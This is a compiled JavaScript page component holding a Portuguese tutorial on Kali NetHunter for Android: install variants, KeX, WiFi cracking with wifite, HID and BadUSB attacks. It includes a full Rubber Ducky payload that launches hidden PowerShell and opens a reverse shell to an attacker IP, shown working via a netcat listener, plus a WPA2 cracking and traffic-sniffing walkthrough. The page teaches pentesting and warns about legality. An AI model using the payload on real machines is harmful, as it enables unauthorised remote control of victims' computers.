import{j as e}from"./index-CAFCz3B4.js";import{P as n}from"./PageContainer-CxmWgrx_.js";import{A as o}from"./AlertBox-Dze8I6Zt.js";import{C as i}from"./CodeBlock-C6bWIuPM.js";import{C as a}from"./CommandTable-CZCYoWRB.js";import{O as r}from"./OutputBlock-PlIt9_KT.js";import{T as t,P as s}from"./PracticeBox-BDRu97pg.js";function S(){return e.jsxs(n,{title:"Kali NetHunter — Kali no Android",subtitle:"Chroot completo + kernel custom + app companion. WiFi pentest, BadUSB, MITM, NetHunter Store. 3 sabores de instalação.",difficulty:"avancado",timeToRead:"16 min",children:[e.jsx("h2",{children:"3 sabores de instalação"}),e.jsx(a,{title:"Qual escolher",variations:[{cmd:"NetHunter Rootless",desc:"Sem root, sem unlock — só Termux + chroot.",output:"Funciona em qualquer Android. SEM kernel features (BadUSB, monitor mode)."},{cmd:"NetHunter Lite",desc:"Root + Magisk, mas kernel padrão.",output:"Tem chroot completo, NÃO tem WiFi monitor / HID."},{cmd:"NetHunter (Full)",desc:"Root + kernel custom da equipe Kali.",output:"TODAS as features. Limitado a OnePlus, Pixel, TicWatch, etc."}]}),e.jsx("h2",{children:"Rootless (em qualquer Android, sem unlock)"}),e.jsx(t,{path:"~ (no Android)",user:"user",host:"termux",lines:[{comment:"1) instalar Termux pelo F-Droid (NÃO use o do Play Store, está abandonado)",cmd:"(F-Droid → Termux)",out:"(app instala normal)",outType:"muted"},{cmd:"pkg update && pkg install wget proot tar -y",out:`Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  proot tar wget
[...]
Installed: wget, tar, proot`,outType:"info"},{cmd:"wget -O install-nethunter-termux https://offs.ec/2MceZWr && chmod +x install-nethunter-termux && ./install-nethunter-termux",out:`==========================================
   Kali NetHunter Termux Installer
==========================================

[?] Detected architecture: aarch64

  1) Full
  2) Minimal
  3) Nano

Choose: 1

[*] Downloading rootfs (~600 MB)...
[*] Verifying SHA512...
[*] Extracting...
[*] Configuring...
[+] Done!

Run the following:
   nethunter        # entra no chroot
   nh               # alias curto
   nh kex          # desktop gráfico via VNC
   nh kex stop`,outType:"success"},{cmd:"nethunter",out:`┌──(root㉿localhost)-[~]
└─# uname -a
Linux localhost 4.14.180+ #1 SMP PREEMPT Wed Apr 3 14:21 UTC 2026 aarch64 GNU/Linux

┌──(root㉿localhost)-[~]
└─# apt update && apt install -y nmap hydra metasploit-framework`,outType:"warning"}]}),e.jsx("h2",{children:"NetHunter App (instalação Full em dispositivo suportado)"}),e.jsx(r,{label:"dispositivos com kernel oficial",type:"muted",children:`Top dispositivos suportados (2026):
  - OnePlus 7T, 8, 8T, 9, 10, 11, Nord, Nord 2
  - Google Pixel 3, 3a, 4, 4a, 5, 6, 6a, 7
  - Samsung Galaxy S10/Note 10 (com TWRP)
  - Sony Xperia (alguns)
  - Gemini PDA, Cosmo Communicator
  - TicWatch Pro 3 (smartwatch!)

Pre-requisitos:
  1. Bootloader desbloqueado (varia por fabricante)
  2. Custom recovery (TWRP, OrangeFox)
  3. Magisk instalado (root)
  4. NetHunter kernel for your device + ROM

Lista atualizada: https://nethunter.kali.org/devices.html`}),e.jsx("h2",{children:"Componentes"}),e.jsx(a,{title:"O que vem na instalação Full",variations:[{cmd:"NetHunter App",desc:"App Android com painel de tudo.",output:"Toggle de chroot, KeX, HID, MITM."},{cmd:"Kali Chroot",desc:"Sistema Kali completo (~5 GB Full / 1 GB Minimal).",output:"Acesso via 'kali' no Termux."},{cmd:"KeX (Kali Desktop)",desc:"Sessão XFCE + VNC interna.",output:"Use teclado bluetooth + monitor HDMI."},{cmd:"NetHunter Store",desc:"Loja de apps de pentest.",output:"Substitui Play Store para apps de segurança."},{cmd:"MAC Changer",desc:"Muda MAC da WiFi.",output:"Sem precisar de app extra."},{cmd:"MITM Framework",desc:"ARP spoof + sniffing.",output:"GUI no app."},{cmd:"HID Attacks",desc:"Conecta no PC via USB e simula teclado.",output:"Tipo Rubber Ducky."},{cmd:"BadUSB MITM",desc:"Cria interface USB ethernet falsa.",output:"PC roteia tráfego pelo celular."},{cmd:"DuckHunter HID",desc:"Roda payloads Rubber Ducky.",output:"Compatível com Hak5 ducky."},{cmd:"Search-and-Destroy",desc:"Roda payload em outro Android conectado.",output:"Em modo MTP."}]}),e.jsx("h2",{children:"KeX — Desktop Kali no celular"}),e.jsx(t,{path:"~",user:"kali",host:"localhost",lines:[{cmd:"kex --passwd",out:`Please enter a new password for kex: ********
Verify it: ********
Password set successfully`,outType:"muted"},{cmd:"kex",out:`Starting KeX server in background...
Started KeX server at :1 (display 5901)

Connect with KeX client:
  Host: localhost
  Port: 5901
  Password: (que você definiu)

Stop with: kex stop`,outType:"info"},{comment:"abrir cliente KeX no Android (preinstalado) — ver desktop XFCE completo do Kali!",cmd:"(no NetHunter App → KeX)",out:"Connecting... [Sucesso] — desktop XFCE em fullscreen, com Burp/Metasploit/etc rodando.",outType:"success"}]}),e.jsx("h2",{children:"WiFi pentest (kernel Full)"}),e.jsx(t,{path:"~",lines:[{comment:"kernel Full vem com drivers patched para monitor mode em wlan0",cmd:"iw list | grep -A 8 'Supported interface modes'",out:`        Supported interface modes:
                 * IBSS
                 * managed
                 * monitor          ← OK!
                 * mesh point
                 * P2P-client
                 * P2P-GO`,outType:"info"},{cmd:"airmon-ng start wlan0",out:`PHY     Interface       Driver          Chipset
phy0    wlan0           qcacld          Qualcomm WCN6855

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)`,outType:"success"},{cmd:"wifite",out:`   .   .__,    .__,        Automated Wireless Auditor
 (\\(\\|\\__,    /  /         wifite v2.7.0
[+] using wlan0mon already in monitor mode
[+] enabling MAC anonymization on wlan0mon

   NUM  ESSID                    CH  ENCR    POWER  WPS?  CLIENT
   ---  --------------           --  ----    -----  ----  ------
    1   HomeWifi                  6  WPA2    98db   yes    1
    2   CafeAlpha                 6  OPN     61db   no     2

[+] select target(s) (1-2): 1
[+] HomeWifi (98db) PMKID CAPTURE: Captured PMKID — cracking...
[+] Cracked password "Senha@2024"`,outType:"warning"}]}),e.jsx("h2",{children:"HID Attack — celular vira teclado USB"}),e.jsx(i,{language:"text",title:"DuckHunter HID — payload Windows + PowerShell reverse",code:`REM Windows + R
DELAY 500
GUI r
DELAY 1000
STRING powershell -ep bypass -w hidden
ENTER
DELAY 800
STRING $client = New-Object System.Net.Sockets.TCPClient('192.168.1.107',4444);
STRING $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
STRING ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
STRING $sendback = (iex $data 2>&1 | Out-String );
STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
STRING $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
STRING $client.Close()
ENTER`}),e.jsx(t,{path:"~",lines:[{comment:"no NetHunter app: HID Attacks → DuckHunter HID → Convert (cola o ducky script) → Execute",cmd:"(plug USB no PC alvo)",out:`(no PC: Win+R abre, powershell aparece, cola a one-liner, conecta de volta)
(no atacante)
$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.55 51842
PS C:\\Users\\vitima> whoami
vitima\\ana
PS C:\\Users\\vitima>`,outType:"error"}]}),e.jsx("h2",{children:"BadUSB MITM"}),e.jsx(t,{path:"~",lines:[{comment:"celular → USB → PC. PC vê uma 'placa de rede USB' nova com gateway = celular",cmd:"(NetHunter app → MITM Framework → BadUSB MITM → Start)",out:`[*] Setting up USB Ethernet gadget
[*] Configured 192.168.42.1 as gateway
[*] Starting DHCP server (offers 192.168.42.10-100)
[*] Starting DNS server (responds with 192.168.42.1 for all queries)
[*] Starting iptables forwarding to wlan0

→ no PC alvo (Win/Linux/Mac), assim que conectar:
  - Detecta 'USB Ethernet'
  - Pega DHCP do celular
  - TODO o tráfego (incl. updates do Windows!) passa pelo celular
  - Você sniffa com tcpdump no Kali do celular`,outType:"warning"},{cmd:"(no Kali do celular) tcpdump -i rndis0 -w /sdcard/captura.pcap",out:`tcpdump: listening on rndis0, link-type EN10MB (Ethernet), capture size 262144 bytes
^C
2841 packets captured`,outType:"info"}]}),e.jsx("h2",{children:"NetHunter Store"}),e.jsx(r,{label:"apps de pentest (não tem na Play Store)",type:"default",children:`No NetHunter App → NetHunter Store:

  - NetHunter App                  (atualizações do core)
  - cSploit                        Network analysis + MITM em GUI
  - Hijacker                       Aircrack-ng GUI nativo Android
  - Termux                         Já vem instalado
  - F-Droid                        Loja alternativa
  - DriveDroid                     Boot ISO no PC pelo USB do cel
  - WiGLE WiFi Wardriving         Mapeamento de redes WiFi
  - Shodan App                     Cliente Shodan
  - Orbot                          Tor
  - InviZible Pro                  Tor + DNScrypt
  - Connectbot                     SSH client
  - Tasker                         Automação
  - Network Scanner                arp scan + portscan`}),e.jsx(s,{title:"Instalar NetHunter Rootless (mais fácil)",goal:"Em 10 minutos ter Kali rodando no seu Android sem unlock.",steps:["F-Droid → instalar Termux (não é o do Play!).","No Termux: pkg update && pkg install wget proot.","Baixar e rodar install-nethunter-termux.","Escolher 'Full' (~600 MB).","Aguardar download + extração.","Rodar 'nethunter' → cair em prompt root@localhost Kali.","Testar: apt install nmap; nmap scanme.nmap.org."],command:`# (no Termux do Android)
pkg update -y && pkg install wget proot tar -y
wget -O install https://offs.ec/2MceZWr
chmod +x install
./install
# (escolher Full)

# depois:
nethunter

# dentro do Kali:
apt install -y nmap
nmap -sV scanme.nmap.org`,expected:`Linux localhost 4.14.180+ aarch64 GNU/Linux

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1
80/tcp   open  http    Apache 2.4.7`,verify:"Sai do chroot com 'exit'. Para apagar: rm -rf $HOME/kali-arm64."}),e.jsx(o,{type:"warning",title:"Bateria + ético",children:"Pentest de WiFi exige monitor mode = consumo enorme de bateria + interferência de RF. Em ambiente público (mall, café) você está captando broadcasts de TODO mundo — em vários países isso é interceptação ilegal mesmo sem ler o conteúdo. Use só com WiFi próprio, em CTF, ou com autorização escrita."}),e.jsxs(o,{type:"info",title:"Smartwatch como pentest device",children:["Existe NetHunter para ",e.jsx("strong",{children:"TicWatch Pro 3"})," — Kali completo num relógio com WiFi monitor + Bluetooth + tela touch. Útil para pentest físico (você fica disfarçado de pessoa olhando o relógio)."]})]})}export{S as default};
